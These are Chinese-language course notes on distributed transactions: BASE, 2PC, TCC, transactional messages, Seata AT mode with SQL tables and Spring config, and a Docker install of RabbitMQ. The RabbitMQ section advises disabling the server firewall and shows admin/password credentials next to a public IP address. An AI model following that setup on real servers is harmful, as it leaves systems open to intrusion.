![image-20210223084444491](img/image-20210223084444491.png)















#### 第2集  分布式事务下数据最终一致性-CAP的权衡结果 BASE理论

**简介：分布式事务下数据最终一致性-BASE理论介绍**

![img](img/285763-20190621144256061-464757033.png)

- 什么是Base理论

```
CAP 中的一致性和可用性进行一个权衡的结果，核心思想就是：我们无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性, 来自 ebay 的架构师提出
```

- Basically Available(基本可用)

  - 假设系统，出现了不可预知的故障，但还是能用, 可能会有性能或者功能上的影响，比如RT是10ms，变成50ms

   

- Soft state（软状态）

  - 允许系统中的数据存在中间状态，并认为该状态不影响系统的整体可用性，即允许系统在多个不同节点的数据副本存在数据延时

   

- Eventually consistent（最终一致性）

  - 系统能够保证在没有其他新的更新操作的情况下，数据最终一定能够达到一致的状态，因此所有客户端对系统的数据访问最终都能够获取到最新的值



* 关于数据一致性
  * 强一致：操作后的能立马一致且可以访问
  * 弱一致：容忍部分或者全部访问不到
  * 最终一致：弱一致性经过多一段时间后，都一致且正常















#### 第3集 分布式事务的常见解决方案概览

**简介：讲解分布式事务常见解决方案概览**

* 常见分布式事务解决方案
  * 2PC  和 3PC
    * 两阶段提交, 基于XA协议
  * TCC 
    *  Try、Confirm、Cancel
  * 事务消息
    * 最大努力通知型

* 分布式事务分类
  * 刚性事务：遵循ACID
  * 柔性事务：遵循BASE理论

* 分布式事务框架
  * TX-LCN：支持2PC、TCC等多种模式
    * https://github.com/codingapi/tx-lcn
    * 更新慢（个人感觉处于停滞状态）
  * Seata：支持 AT、TCC、SAGA 和 XA 多种模式
    * https://github.com/seata/seata
    * 背靠阿里，专门团队推广
    * 阿里云商业化产品GTS
      * https://www.aliyun.com/aliware/txc
  * RocketMq：自带事务消息解决分布式事务
    * https://github.com/apache/rocketmq









**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十三章  架构师系列-玩转分布式事务N种解决方案和利弊选择



#### 第1集 分布式事务的常见核心概念知识讲解

**简介：讲解分布式事务常见核心概讲解**

* 前置知识

  * X/OpenDTP 事务模型

  ```
  是X/Open 这个组织定义的一套分布式事务的标准，也就是定义了规范和 API 接口，由各个厂商进行具体的实现
  
  DTP 是分布式事物处理(Distributed Transaction Processing)的简称
  ```

  

  * XA协议

  ```
  XA是由X/Open组织提出的分布式事务规范。
  
  XA规范主要定义了(全局)事务管理器(TM)和(局 部)资源管理器(RM)之间的接口
  
  主流的数据库产品都实现了XA接口，是一个双向的系统接口，在事务管理器以及多个资源管理器之间作为通信桥梁
  ```

  * JTA

  ```
  Java Transaction API,java根据XA规范提供的事务处理标准
  ```

  * AP

  ```
  application, 应用程序也就是业务层，微服务等
  ```

  * RM

  ```
  Resource Manager，资源管理器。一般是数据库，也可以是其他资源管理器，比如消息队列，文件系统
  ```

  * TM

  ```
  Transaction Manager ，事务管理器、事务协调者，负责接收来自用户程序（AP）发起的 XA 事务指令，并调度和协调参与事务的所有 RM（数据库），确保事务正确完成
  ```

  

* 事务模型

```
在分布式系统中，每一个机器节点能够明确知道自己在进行事务操作过程中的 结果是成功还是失败，但无法直接获取到其他分布式节点的操作结果

当一个事务操作跨越多个分布式节点的时候，为了保持事务处理的 ACID 特性，

需要引入一个“协调者”（TM）来统一调度所有分布式节点的执行逻辑，这些被调度的分布式节点被称为 AP。

TM 负责调度 AP 的行为，并最终决定这些 AP 是否要把事务真正进行提交到（RM）
```

![image-20210223190740883](img/image-20210223190740883.png)

























#### 第2集 XA实现分布式事务的原理-两阶段提交2PC流程解析

**简介：讲解XA实现分布式事务的原理**

* XA协议规范-实现分布式事务的原理如下

  * 一般习惯称为 两阶段提交协议（The two-phase commit protocol，2PC）

  * 是XA用于在全局事务中协调多个资源的机制，MySql5.5以上开始支持

  * 准备阶段：

    ```
    事务管理器给每个参与者都发送Prepared消息，每个数据库参与者在本地执行事务，并写本地的Undo/Redo日志，此时事务没有提交。
    ```

    *  Undo日志是记录修改前的数据，用于数据库回滚
    *  Redo日志是记录修改后的数据，用于提交事务后写入数据

  * 提交阶段：

    *  如果事务管理器收到了参与者的执行失败或者超时消息时，直接给每个参与者发送回滚（Rollback）消息,否则发送提交（Commit）消息;
    *  参与者根据事务管理器的指令执行【提交】或者【回滚】操作，并释放事务处理过程中使用的锁资源
    *  注意：必须在最后阶段释放锁资源。

![image-20210223153657903](img/image-20210223153657903.png)



* 总结
  * XA协议简单，数据库支持XA协议，开发使用成本比较低
  * 对业务侵⼊很小，最⼤的优势就是对使⽤⽅透明
  * 用户可以像使⽤本地事务⼀样使⽤基于 XA 协议的分布式事务，能够严格保障事务 ACID 特性
  * 事务执⾏过程中需要将所需资源全部锁定，也就是俗称的刚性事务
    * 刚性事务：遵循ACID
    * 柔性事务：遵循BASE理论
  * 性能不理想，占用锁资源比较多，高并发常见下无法满足
  * 商业付费数据库支持好，mysql目前支持不是很完善
  * 基于 XA 协议的 除了2PC，还有 3PC等
    * 三段提交（3PC）是二阶段提交（2PC）的一种改进版本 ，为解决两阶段提交协议的阻塞问题
    * 采用超时机制，解决TM故障后RM的阻塞问题，但与此同时却多了一次网络通信，性能上也不理想
  * 2PC和3PC目前使用不是很多，只做简单了解即可





















#### 第3集 分布式事务的解决方案之一-柔性事务-TCC介绍

**简介：讲解TCC柔性事务的解决方案**

* 什么是TCC柔性事务 
  * 刚性事务：遵循ACID
  * 柔性事务：遵循BASE理论
  * TCC: 
    * 将事务提交分为 
      * Try：完成所有业务检查( 一致性 ) ，预留必须业务资源( 准隔离性 )
      *  Confirm ：对业务系统做确认提交，默认 Confirm阶段不会出错的 即只要Try成功，Confirm一定成功
      * Cancel : 业务执行错误，需要回滚的状态下执行的业务取消，预留资源释放, 进行补偿性
    * TCC 事务和 2PC 的类似，Try为第一阶段，Confirm - Cancel为第二阶段，它对事务的提交/回滚是通过执行一段 confirm/cancel 业务逻辑来实现，并且也并没有全局事务来把控整个事务逻辑

| 含义                                                         | 操作方法 |
| ------------------------------------------------------------ | -------- |
| 预留业务资源/数据效验                                        | Try      |
| 确认执行业务操作，提交数据，不做任何业务检查，try成功，confirm必定成功，需保证幂等 | Confirm  |
| 取消执行业务操作，回滚数据，需保证幂等，也是常说的补偿性事务 | Cancel   |

* 看下TCC的交互图（图片来源网上）

![image-20210223165419429](img/image-20210223165419429.png)

* 优点：
  * 它把事务运行过程分成 Try、Confirm/Cancel 两个阶段
  * 每个阶段由业务代码控制，这样事务的锁力度可以完全自由控制
  * 不存在资源阻塞的问题，每个方法都直接进行事务的提交
* 缺点
  * 在业务层编写代码实现的两阶段提交，原本一个方法，现在却需要三个方法来支持
  * 对业务的侵入性很强，不能很好的复用
* 注意：使用TCC时要注意Try - Confirm - Cancel 3个操作的**幂等控制**，由于网络原因或者重试操作都有可能导致这几个操作的重复执行





















#### 第4集 分布式事务的解决方案之一事务消息

**简介：讲解分布式事务的解决方案之一事务消息**

* 事务消息

  * 消息队列提供类似Open XA的分布式事务功能，通过消息队列事务消息能达到分布式事务的最终一致

    

* 半事务消息

  * 暂不能投递的消息，发送方已经成功地将消息发送到了消息队列服务端，但是服务端未收到生产者对该消息的二次确认，此时该消息被标记成“暂不能投递”状态，处于该种状态下的消息即半事务消息。

* 消息回查

  * 由于网络闪断、生产者应用重启等原因，导致某条事务消息的二次确认丢失，消息队列服务端通过扫描发现某条消息长期处于“半事务消息”时，需要主动向消息生产者询问该消息的最终状态（Commit或是Rollback），该询问过程即消息回查

* 交互图（来源rocketmq官方文档）



![事物消息](img/p177406.png)

* 目前较为主流的MQ，比如ActiveMQ、RabbitMQ、Kafka、RocketMQ等，只有RocketMQ支持事务消息
  * 如果其他队列需要事务消息，可以开发个消息服务，自行实现半消息和回查功能

* 好处
  * 事务消息不仅可以实现应用之间的解耦，又能保证数据的最终一致性
  * 同时将传统的大事务可以被拆分为小事务，能提升效率
  * 不会因为某一个关联应用的不可用导致整体回滚，从而最大限度保证核心系统的可用性

* 缺点
  * 不能实时保证数据一致性
  * 极端情况下需要人工补偿，比如 假如生产者成功处理本地业务，消费者始终消费不成功















#### 第5集 最终一致性的体现-第三方支付平台和微服务之间的通讯

**简介：讲解第三方支付平台和微服务之间的交互**

* 支付业务
  * 支付宝支付
  * 微信支付
  * 其他支付

* 多个服务之间通信，怎么保证分布式事务呢？
* 利用最终一致性思想，也叫柔性事务解决方案

![img](img/5_0.png)












**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十四 阿里开源分布式事务框架-Seata 新版最佳实践



#### 第1集 阿里巴巴开源分布式事务框架Seata介绍

**简介：讲解分布式事务框架Seata介绍**

* 分布式事务框架

  * TX-LCN：支持2PC、TCC等多种模式
    * https://github.com/codingapi/tx-lcn
    * 更新慢（个人感觉处于停滞状态）
  * Seata：支持 AT、TCC、SAGA 和 XA 多种模式
    * https://github.com/seata/seata
    * 背靠阿里，专门团队推广

* 为啥选择Seata呢

  * git地址
    * https://github.com/seata/seata
  * 背靠阿里，专门团队推广和技术团队
  * 已经线上大规模使用且没出现重大漏洞
  * 和主流微服务框架轻松整合
  * 社区活跃度高、文档齐全、功能强大

  ![image-20210223200804237](img/image-20210223200804237.png)

  * 有专门的阿里云商业化产品GTS，可以无缝迁移

  ![Seata Roadmap](img/p88927.png)

  

* 什么是Seata

  * 一个开源的分布式事务框架, 由阿里中间件团队发起的开源项目Fescar，后更名为Seata
  * 中文文档地址
    * http://seata.io/zh-cn/
  * 详细介绍

  ```
  是一款开源的分布式事务解决方案，致力于在微服务架构下提供高性能和简单易用的分布式事务服务。
  
  在 Seata 开源之前，Seata 对应的内部版本在阿里经济体内部一直扮演着分布式一致性中间件的角色，帮助经济体平稳的度过历年的双11，对各BU业务进行了有力的支撑。
  
  经过多年沉淀与积累，商业化产品先后在阿里云、金融云进行售卖。
  
  2019.1 为了打造更加完善的技术生态和普惠技术成果，Seata 正式宣布对外开源，未来 Seata 将以社区共建的形式帮助其技术更加可靠与完备
  ```

  

  * 文档比较详细，如果大家把上一章分布式事务的核心知识：
    * XA协议的2PC、TCC、事务消息掌握，那学起来会很轻松



















#### 第2集 分布式事务框架Seata核心组件和术语介绍

**简介：讲解分布式事务框架Seata核心组件和术语**

* **Seata主要由三个重要组件组成：**
  
* TC：Transaction Coordinator 事务协调器，管理全局的分支事务的状态，用于全局性事务的提交和回滚。
  
* TM：Transaction Manager 事务管理器，用于开启、提交或者回滚【全局事务】。
  
* RM：Resource Manager 资源管理器，用于分支事务上的资源管理，向TC注册分支事务，上报分支事务的状态，接受TC的命令来提交或者回滚分支事务
  
    * 传统XA协议实现2PC方案的 RM 是在数据库层，RM本质上就是数据库自身；
  *  Seata的RM是以jar包的形式嵌入在应用程序里面
  
  
  
*  **架构：TC 为单独部署的 Server 服务端，TM 和 RM 为嵌入到应用中的 Client 客户端**

  

![img](img/TB1rDpkJAvoK1RjSZPfXXXPKFXa-794-478.png)

* 对比X/OpenDTP事务模型

![image-20210223190740883](img/image-20210223190740883.png)

* 其它术语

  * XID
    * TM 请求 TC 开启一个全局事务, TC 会生成一个 XID 作为该全局事务的编号XID, XID会在微服务的调用链路中传播，保证将多个微服务的子事务关联在一起

  























#### 第3集 Seata框架里面分布式事务的生命周期过程描述

**简介：讲解分布式事务框架Seata事务处理过程描述**

* 一个典型的事务过程包括：
  * A服务的TM 向 TC 申请开启（Begin）一个全局事务，全局事务创建成功并生成一个全局唯一的 XID。
  * A服务的RM向TC注册分支事务
  * A服务执行分支事务，对数据库做操作
  * A服务开始远程调用B服务，并把XID 在微服务调用链路的上下文中传播。
  * B服务的RM向TC注册分支事务，并将其纳入XID对应的全局事务的管辖
  * B服务执行分支事务，向数据库做操作
  * 全局事务调用链处理完毕，TM 根据有无异常向 TC 发起针对 XID 的全局提交（Commit）或回滚（Rollback）决议。
  * TC 调度 XID 下管辖的全部分支事务完成提交（Commit）或回滚（Rollback）请求。

![image-20210223202951473](img/image-20210223202951473.png)

* 好看点的图

![img](img/TB1rDpkJAvoK1RjSZPfXXXPKFXa-794-478.png)

* Seata 实现分布式事务，关键角色UNDO_LOG（回滚日志记录表）

```
在每个应用需要分布式事务的业务库中创建这张表，这个表的核心作用是将业务数据在更新前后的数据镜像组织成回滚日志，保存在UNDO_LOG表中，以便业务异常能随时回滚
```





















#### 第4集 分布式事务框架Seata的AT模式流程介绍

**简介：介绍Seata的AT模式流程**

* `Seata`有四种模式： （简单了解即可，深入的话看分布式事务专题）

  * AT

    * AT模式可以应对大多数的业务场景，并且基本可以做到无业务入侵、开发者无感知

    * 用户只需关心自己的 业务SQL. AT 模式分为两个阶段，可以认为是2PC

      - 一阶段：执行用户SQL

      ```
      Seata 会拦截“业务 SQL”，找到“业务 SQL”要更新的业务数据，在业务数据被更新前，将其保存成“before image”，然后执行“业务 SQL”更新业务数据
      
      在业务数据更新之后，再将其保存成“after image”，最后生成行锁
      
      以上操作全部在一个数据库事务内完成，这样保证了一阶段操作的原子性
      ```

      

      - 二阶段：`Seata`框架自动生成提交或者回滚

      ```
      二阶段提交: 因为“业务 SQL”在一阶段已经提交至数据库， 所以 Seata 框架只需将阶段一保存的快照数据和行锁删掉，完成数据清理即可。
      
      
      二阶段回滚: 还原业务数据, 回滚方式便是用“before image”还原业务数据；
      但在还原前要首先要校验脏写，对比“数据库当前业务数据”和 “after image”
      如果两份数据完全一致就说明没有脏写，可以还原业务数据，如果不一致就说明有脏写，出现脏写就需要转人工处理 
      ```

      

  * TCC

  * Sage

  * XA















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十五章  SpringCloudAlibaba微服务整合分布式事务Seata实战

#### 第1集 新版本-分布式事务框架Seata 服务端部署安装最佳实践

**简介：讲解新版本Seata分布式事务的部署和安装**

* 基于AT模式

  * 创建undo_log表, 每个库都需要
  * http://seata.io/zh-cn/docs/dev/mode/at-mode.html

  ```
  -- 注意此处0.7.0+ 增加字段 context
  CREATE TABLE `undo_log` (
    `id` bigint(20) NOT NULL AUTO_INCREMENT,
    `branch_id` bigint(20) NOT NULL,
    `xid` varchar(100) NOT NULL,
    `context` varchar(128) NOT NULL,
    `rollback_info` longblob NOT NULL,
    `log_status` int(11) NOT NULL,
    `log_created` datetime NOT NULL,
    `log_modified` datetime NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`)
  ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
  ```

  

* 下载部署Seata的TC服务端

  * http://seata.io/zh-cn/blog/download.html
  * 我们下载1.3就行，不要下载最新的（除非对新的很有把握不出问题）

* Linux/Mac/Windows服务器安装

  * 解压 
  * 修改jvm内存（默认是2g，防止内存不够）
  * ./seata-server.sh 启动，默认是8091端口（记得防火墙开放端口，也可以nohup守护进程启动）



* TC需要存储全局事务和分支事务的记录，支持三种存储模式
  * file模式 (默认)：性能高, 适合单机模式，在内存中读写，并持久化到本地文件中
    * 在 bin/sessionStore/root.data文件
  * db模式 ：性能较差，适合tc集群模式
  * redis模式：性能教高，适合tc集群模式



* 问题：
  * seata 在 JDK11下运行报错
  * 解决: 下载下来的seata 默认没有存放日志文件的目录, 手动创建seata/logs/seata_gc.log 目录和文件



















#### 第2集 SpringCloudAlibaba微服务整合Seata分布式事务框架《上》

**简介：SpringCloudAlibaba整合分布式事务seata框架**

* common项目添加依赖
  * 出现的问题：no available service 'null' found, please make sure registry config correct
  * 安装的服务端版本必须要和你客户端的版本保持一样

```
 <!--alibaba微服务整合分布式事务，上面的方式不行  mvn 包冲突-->
        <dependency>
            <groupId>com.alibaba.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-seata</artifactId>
        </dependency>
        
 
        <!--alibaba微服务整合分布式事务，这个方式才行-->
        <dependency>
            <groupId>com.alibaba.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-seata</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>io.seata</groupId>
                    <artifactId>seata-spring-boot-starter</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>io.seata</groupId>
            <artifactId>seata-spring-boot-starter</artifactId>
            <version>1.3.0</version>
        </dependency>
```

* 各个微服务配置文件修改

```
#seata配置
seata:
  tx-service-group: ${spring.application.name}-group
  service:
    grouplist:
      xdclass: 127.0.0.1:8091
    vgroup-mapping:
      xdclass-user-service-group: xdclass
```

![image-20210224181637038](img/image-20210224181637038.png)



















#### 第3集 SpringCloudAlibaba微服务整合Seata分布式事务框架《下》

**简介：SpringCloudAlibaba整合分布式事务seata框架《下》**

* 注释掉全局异常
* 开发测试接口
* 测试分布式事务
* TM入口service的方法增加 @GlobalTransactional 注解























#### 第4集 Seata分布式事务undo_log表-分析AT模式执行机制回顾

**简介：分布式事务AT模式执行机制回顾梳理**

* AT

  * AT模式可以应对大多数的业务场景，并且基本可以做到无业务入侵、开发者无感知

  * 用户只需关心自己的 业务SQL. AT 模式分为两个阶段，可以认为是2PC
    * 一阶段：执行用户SQL

  ```
  Seata 会拦截“业务 SQL”，找到“业务 SQL”要更新的业务数据，在业务数据被更新前，将其保存成“before image”，然后执行“业务 SQL”更新业务数据
  
  在业务数据更新之后，再将其保存成“after image”，最后生成行锁
  
  以上操作全部在一个数据库事务内完成，这样保证了一阶段操作的原子性
  ```

  

  -  二阶段：`Seata`框架自动生成提交或者回滚

  ```
  二阶段提交: 因为“业务 SQL”在一阶段已经提交至数据库， 所以 Seata 框架只需将阶段一保存的快照数据和行锁删掉，完成数据清理即可。
  
  
  二阶段回滚: 还原业务数据, 回滚方式便是用“before image”还原业务数据；
  但在还原前要首先要校验脏写，对比“数据库当前业务数据”和 “after image”
  如果两份数据完全一致就说明没有脏写，可以还原业务数据，如果不一致就说明有脏写，出现脏写就需要转人工处理 
  ```

  

* undo_log表的rollback_info字段

```
{"@class":"io.seata.rm.datasource.undo.BranchUndoLog","xid":"192.168.0.115:8091:107926818928988160","branchId":107926819939815424,"sqlUndoLogs":["java.util.ArrayList",[{"@class":"io.seata.rm.datasource.undo.SQLUndoLog","sqlType":"INSERT","tableName":"user","beforeImage":{"@class":"io.seata.rm.datasource.sql.struct.TableRecords$EmptyTableRecords","tableName":"user","rows":["java.util.ArrayList",[]]},"afterImage":{"@class":"io.seata.rm.datasource.sql.struct.TableRecords","tableName":"user","rows":["java.util.ArrayList",[{"@class":"io.seata.rm.datasource.sql.struct.Row","fields":["java.util.ArrayList",[{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"id","keyType":"PRIMARY_KEY","type":-5,"value":["java.math.BigInteger",26]},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"name","keyType":"NULL","type":12,"value":null},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"pwd","keyType":"NULL","type":12,"value":"34234234"},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"head_img","keyType":"NULL","type":12,"value":null},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"slogan","keyType":"NULL","type":12,"value":null},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"sex","keyType":"NULL","type":-6,"value":1},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"points","keyType":"NULL","type":4,"value":0},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"create_time","keyType":"NULL","type":93,"value":["java.sql.Timestamp",[1614166959000,0]]},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"mail","keyType":"NULL","type":12,"value":"2343223@qq.com"},{"@class":"io.seata.rm.datasource.sql.struct.Field","name":"secret","keyType":"NULL","type":12,"value":"111"}]]}]]}}]]}
```























#### 第5集  全局异常下微服务整合Seata分布式事务失效解决方案

**简介：自定义全局异常下分布式事务失效解决方案**

* 问题： 微服务场景下，配置了统一全局异常处理，导致seata在AT模式下无法正常回滚问题
  * 如果使用Feign 配置了容错类(fallback)或者容错工厂(fallbackFactory)，也是一样的问题
* 原因：服务A调用服务B， 服务B发生异常，由于全局异常处理的存在（@ControllerAdvice）, seata 无法拦截到B服务的异常，从而导致分布式事务未生效
* 解决思路

```
配置了全局异常处理，所以rpc一定会有返回值, 所以在每个全局事务方法最后， 需要判断rpc是否发生异常
发生异常则抛出 RuntimeException或者子类
```

* 方式一：RPC接口不配置全局异常
* 方式二：利用AOP切面解决
* 方式三：程序代码各自判断RPC响应码是否正常，再抛出异常























#### 第6集  架构必备-高并发下分布式事务下的总结和思考

**简介：高并发业务下分布式事务的选择和思考**

* 分布式事务解决方案很多，XA的2PC、TCC、MQ事务消息等
* 框架也有Seata, 同时支持多种方式模式
* 重点

```
不管选哪一种方案，在项目中应用都要谨慎再思考，
除特定的数据强一致性场景外，能不用尽量就不要用

因为无论它们性能如何优越，一旦项目链路加入分布式事务
整体效率会几倍的下降，在高并发情况下弊端尤为明显
```

* 任何多链路的操作，换个方案或者换个思路，可以避免使用分布式事务（接下去大课就是）
  * 下单商品库存锁定
  * 下单优惠券记录锁定
* 总之
  * 分布式事务和分布式锁一样，能不用就不用
  * 实在要用，使用优先是 柔性事务，实在无法满足再考虑 刚性事务
  * 分布式锁也是，尽量降低锁的粒度













**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十六章  高性能的数据一致性方案-扣减库存和优惠券记录锁定设计



#### 第1集 分布式事务的另一种解决方案-下单商品库存扣减

**简介：分布式事务事务的另一种解决方案，下单商品库存的扣减**

* 下单伪代码

  ```
      * * 防重提交
       * * 用户微服务-确认收货地址
       * * 商品微服务-获取最新购物项和价格
       * * 订单验价
       *   * 优惠券微服务-获取优惠券
       *   * 验证价格
       * * 锁定优惠券
       * * 锁定商品库存
       * * 创建订单对象
       * * 创建子订单对象
       * * 发送延迟消息-用于自动关单
       * * 创建支付信息-对接三方支付
  ```

* 下单里面的分布式事务

![image-20210225103926850](img/image-20210225103926850.png)

* 核心逻辑
  * 用下单：锁库存和优惠券记录
  * 下单异常或者超时未支付：释放库存和优惠券记录

* 初体验

![image-20210225112901588](img/image-20210225112901588.png)























#### 第2集 【重点】深入架构流程图-下单商品库存扣减多场景异常处理

**简介：深入扣减下单商品库存的扣减多场景异常处理**

* 核心逻辑
  * 用下单：锁库存和优惠券记录
  * 下单异常或者超时未支付：释放库存和优惠券记录



* 锁定记录状态   `lock_state`  '锁定状态锁定LOCK-完成 FINISH-取消CANCEL',

![image-20210225113554433](img/image-20210225113554433.png)











#### 第3集 抽取架构业务模型-优惠券记录扣减-释放流程解析

**简介：触类旁通-抽取架构业务模型-转移到优惠券记录扣减回收**

* 核心逻辑
  * 用下单：锁库存和优惠券记录
  * 下单异常或者超时未支付：释放库存和优惠券记录



* 锁定记录状态   `lock_state`  '锁定状态锁定LOCK-完成 FINISH-取消CANCEL',

![image-20210225114513121](img/image-20210225114513121.png)



















#### 第4集 商品库存锁定和优惠券记录锁定任务表设计

**简介：商品库存锁定和优惠券记录锁定任务表设计**

* 下单锁库存任务表设计

```
CREATE TABLE `product_task` (
  `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(11) DEFAULT NULL COMMENT '商品id',
  `buy_num` int(11) DEFAULT NULL COMMENT '购买数量',
  `product_name` varchar(128) DEFAULT NULL COMMENT '商品标题',
  `lock_state` varchar(32) DEFAULT NULL COMMENT '锁定状态锁定LOCK  完成FINISH-取消CANCEL',
  `out_trade_no` varchar(32) DEFAULT NULL,
  `create_time` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;
```

![image-20210225114834589](img/image-20210225114834589.png)

* 优惠券记录锁定任务表设计

```
CREATE TABLE `coupon_task` (
  `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
  `coupon_record_id` bigint(11) DEFAULT NULL COMMENT '优惠券记录id',
  `create_time` datetime DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `out_trade_no` varchar(64) DEFAULT NULL COMMENT '订单号',
  `lock_state` varchar(32) DEFAULT NULL COMMENT '锁定状态 锁定LOCK-完成FINISH 取消CANCEL',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;
```

![image-20210225114705084](img/image-20210225114705084.png)











#### 第5集 商品库存锁定和优惠券记录锁定任务表代码生成

**简介：商品库存锁定和优惠券记录锁定任务表代码生成**



* 代码生成
























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十七章 新版消息队列RabbitMQ回顾和容器化安装部署

 

#### 第1集 基于Linux服务器安装RabbitMQ容器化部署

**简介：Docker安装RabbitMQ消息队列**

- 阿里云安装RabbitMQ
  - 阿里云折扣地址 https://www.aliyun.com/minisite/goods?userCode=r5saexap&share_source=copy_link
  - 最少 2核4g或者推荐 2核8g（用家人账号购买，接近1折，初次买1年或者3年）
- 登录个人的Linux服务器
  - ssh root@8.129.113.233
- Docker安装RabbitMQ
  - 地址：https://hub.docker.com/_/rabbitmq/

```
#拉取镜像
docker pull rabbitmq:3.8.12-management-alpine

docker run -d --hostname rabbit_host1 --name xd_rabbit -e RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=password -p 15672:15672 -p 5672:5672 rabbitmq:3.8.12-management-alpine

#介绍
-d 以守护进程方式在后台运行
-p 15672:15672 management 界面管理访问端口
-p 5672:5672 amqp 访问端口
--name：指定容器名
--hostname：设定容器的主机名，它会被写到容器内的 /etc/hostname 和 /etc/hosts，作为容器主机IP的别名，并且将显示在容器的bash中

-e 参数
  RABBITMQ_DEFAULT_USER 用户名
  RABBITMQ_DEFAULT_PASS 密码
```

* 主要端口介绍

```
4369 erlang 发现口

5672 client 端通信口

15672 管理界面 ui 端口

25672 server 间内部通信口
```

- 访问管理界面

  - ip:15672

- 注意事项！！！！

  - Linux服务器检查防火墙是否关闭
  - 云服务器检查网络安全组是否开放端口

  ```
  CentOS 7 以上默认使用的是firewall作为防火墙
  查看防火墙状态
  firewall-cmd --state
  
  停止firewall
  systemctl stop firewalld.service
  
  禁止firewall开机启动
  systemctl disable firewalld.service
  ```

  















#### 第2集 延迟队列核心知识之RabbitMQ死信队列 + TTL回顾

**简介：讲解RabbitMQ的的死信队列+ TTL**

- 什么是TTL

  - time to live 消息存活时间
  - 如果消息在存活时间内未被消费，则会别清除
  - RabbitMQ支持两种ttl设置
    - 单独消息进行配置ttl
    - 整个队列进行配置ttl（居多）

   

- 什么是rabbitmq的死信队列

  - 没有被及时消费的消息存放的队列

- 什么是rabbitmq的死信交换机

  - Dead Letter Exchange（死信交换机，缩写：DLX）当消息成为死信后，会被重新发送到另一个交换机，这个交换机就是DLX死信交换机。

    ![image-20210225142616107](img/image-20210225142616107.png)

  ![image-20210114155825153](https://file.xdclass.net/note/2021/rabbitmq/img/image-20210114155825153.png)

 

- 消息有哪几种情况成为死信

  - 消费者拒收消息**（basic.reject/ basic.nack）**，并且没有重新入队 **requeue=false**
  - 消息在队列中未被消费，且超过队列或者消息本身的过期时间**TTL(time-to-live)**
  - 队列的消息长度达到极限
  - 结果：消息成为死信后，如果该队列绑定了死信交换机，则消息会被死信交换机重新路由到死信队列

   





















#### 第3集 RabbitMQ 延迟队列介绍和应用场景回顾

**简介：讲解RabbitMQ的延迟队列和应用场景**

- 什么是延迟队列
  - 一种带有延迟功能的消息队列，Producer 将消息发送到消息队列 服务端，但并不期望这条消息立马投递，而是推迟到在当前时间点之后的某一个时间投递到 Consumer 进行消费，该消息即定时消息

 

- 使用场景

  - 通过消息触发一些定时任务，比如在某一固定时间点向用户发送提醒消息
  - 用户登录之后5分钟给用户做分类推送、用户多少天未登录给用户做召回推送；
  - 消息生产和消费有时间窗口要求：比如在天猫电商交易中超时未支付关闭订单的场景，在订单创建时会发送一条 延时消息。这条消息将会在 30 分钟以后投递给消费者，消费者收到此消息后需要判断对应的订单是否已完成支付。 如支付未完成，则关闭订单。如已完成支付则忽略

   

- Cloud微服务大课训练营里面的应用

  - 优惠券回收
  - 商品库存回收



- 业界的一些实现方式
  - 定时任务高精度轮训
  - 采用RocketMQ自带延迟消息功能
  - RabbitMQ本身是不支持延迟队列的，怎么办？
    - 结合死信队列的特性，就可以做到延迟消息
    - 操作
      * 消息生产
        - 投递到普通的topic交换机
        - 消息过期，进入死信交换机
      * 消息消费
        - 消费者监听死信交换机的队列

![image-20210115165003935](https://file.xdclass.net/note/2021/rabbitmq/img/image-20210115165003935.png)























#### 第4集 SpringCloudAlibaba微服务整合RabbitMQ依赖和配置

**简介：项目整合RabbitMQ依赖和配置**

* 什么是Spring-AMQP
  - 官网：https://spring.io/projects/spring-amqp
  - Spring 框架的AMQP消息解决方案，提供模板化的发送和接收消息的抽象层，提供基于消息驱动的 POJO的消息监听等
  - 提供不依赖于任何特定的AMQP代理实现或客户端库通用的抽象，最终用户代码将很容易实现更易替换、添加和删除AMQP，因为它可以只针对抽象层来开发
  - 总之就是提高我们的框架整合消息队列的效率,SpringBoot为更方便开发RabbitMQ推出了starter,
  - 我们使用 spring-boot-starter-amqp 进行开发
* common项目添加依赖

```
       <!--引入AMQP-->
       <dependency>
           <groupId>org.springframework.boot</groupId>
           <artifactId>spring-boot-starter-amqp</artifactId>
       </dependency>
```

* 各个微服务添加配置

```
  #消息队列
  rabbitmq:
    host: 8.129.113.233
    port: 5672
    virtual-host: /
    password: password
    username: admin
    #开启手动确认消息
    listener:
      simple:
        acknowledge-mode: manual
```

* 其他自定义配置后续添加
















